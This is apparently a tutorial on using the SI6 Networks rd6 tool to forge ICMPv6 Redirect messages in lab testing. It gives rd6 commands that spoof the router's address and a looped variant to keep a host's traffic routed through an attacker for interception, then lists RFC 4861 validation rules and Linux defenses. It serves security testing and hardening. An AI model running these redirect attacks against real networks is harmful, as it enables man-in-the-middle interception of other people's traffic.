# How to Use the SI6 Networks rd6 Tool for Redirect Attacks

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: SI6 Networks, Rd6, IPv6, Redirect, NDP, Security Testing

Description: A guide to using the SI6 Networks rd6 tool to test ICMPv6 Redirect message handling and traffic redirection vulnerabilities in authorized lab environments.

The `rd6` tool from the SI6 Networks IPv6 toolkit crafts ICMPv6 Redirect messages (Type 137). In IPv6, routers send Redirect messages to inform hosts of a better next-hop for a particular destination. A rogue Redirect can redirect a host's traffic to an attacker-controlled address, enabling man-in-the-middle attacks. `rd6` tests whether hosts properly validate Redirect messages.

**Warning**: Only use in authorized lab environments. Sending rogue Redirects on production networks is illegal and disruptive.

## Understanding ICMPv6 Redirects

```text
Normal flow:         Host A → Router → Destination
After rogue redirect: Host A → Attacker → Destination (MITM)
```

A Redirect tells Host A: "For destination X, use next-hop Y instead of me." If Y is the attacker's address, all traffic to X passes through the attacker.

## Installing the SI6 Networks Toolkit

```bash
sudo apt-get install ipv6toolkit   # Debian/Ubuntu
yay -S ipv6toolkit                  # Arch Linux (AUR)
```

## Basic rd6 Usage

```bash
# Send a basic ICMPv6 Redirect message
sudo rd6 -i eth0 --learn-router \
  -d 2001:db8::10 \
  --redir-dest 2001:db8::20 \
  --redir-target fe80::bad

# Redirect traffic from target to attacker.
# The source must appear to be the current router for the redirected destination.
sudo rd6 -i eth0 \
  -s fe80::1 \
  -d 2001:db8::10 \
  --redir-dest 2001:db8::20 \
  --redir-target fe80::bad
```

## Key rd6 Parameters

```bash
# -s: Source address (should be the legitimate router's link-local)
# -d: Destination (the host to redirect)
# --redir-dest: The destination address being redirected
# --redir-target: The new next-hop address (where to send traffic)

# Example: Redirect Host A's traffic to a server through attacker
sudo rd6 -i eth0 \
  -s fe80::1 \
  -d fe80::2 \
  --redir-dest 2001:db8::20 \
  --redir-target fe80::bad
```

## Redirect with Redirected Header Option

ICMPv6 Redirects can include part of the original packet (Redirected Header option), which makes them appear more legitimate. `rd6` includes this option by default unless `--no-payload` is used:

```bash
# Include the default Redirected Header option
sudo rd6 -i eth0 \
  -s fe80::1 \
  -d fe80::2 \
  --redir-dest 2001:db8::20 \
  --redir-target fe80::bad
```

## Continuous Redirect Attack

Redirect entries in the routing table may timeout; continuous sending maintains the redirection:

```bash
# Send Redirect every 30 seconds
sudo rd6 -i eth0 \
  -s fe80::1 \
  -d fe80::2 \
  --redir-dest 2001:db8::20 \
  --redir-target fe80::bad \
  --loop --sleep 30
```

## Verifying Redirect Effect

On the target host, check the routing table:

```bash
# Check if redirect was accepted
ip -6 route show cache

# Look for routes with "cache" and "proto redirect"
# Redirects appear as host routes in the route cache
ip -6 route show table cache proto redirect

# Remove redirect from cache (revert)
ip -6 route flush cache
```

## Validating Redirect Security

RFC 4861 specifies validation rules for Redirect acceptance:

1. Source address must be link-local and must match the current first-hop router for the redirected destination
2. IPv6 Hop Limit must be 255, the ICMPv6 Code must be 0, and the checksum and length must be valid
3. ICMP Destination must not be multicast
4. ICMP Target must be link-local when redirecting to a router, or equal to ICMP Destination when marking the destination on-link
5. Included options must have non-zero lengths

```bash
# Test if your host incorrectly accepts redirects from non-routers
sudo rd6 -i eth0 \
  -s 2001:db8::99 \
  -d 2001:db8::10 \
  --redir-dest 2001:db8::20 \
  --redir-target fe80::bad
# A properly configured host should ignore this
```

## Defenses Against Rogue Redirects

```bash
# Disable ICMPv6 Redirect acceptance on Linux
sudo sysctl -w net.ipv6.conf.eth0.accept_redirects=0

# Make persistent
printf '%s\n' \
  'net.ipv6.conf.all.accept_redirects = 0' \
  'net.ipv6.conf.default.accept_redirects = 0' | sudo tee /etc/sysctl.d/99-ipv6-redirects.conf
sudo sysctl --system
```

| Defense | Effect |
|---|---|
| `accept_redirects=0` | Host ignores all ICMPv6 Redirects |
| SEND (RFC 3971) | Cryptographically validates NDP messages |
| Stateful firewalls | Can filter unexpected Redirect sources |
| NDPMon | Alerts on unexpected Redirect messages |

Disabling `accept_redirects` is the most practical defense for servers and sensitive hosts. Client machines may need it enabled for legitimate network topology optimization, so the tradeoff must be evaluated per environment.
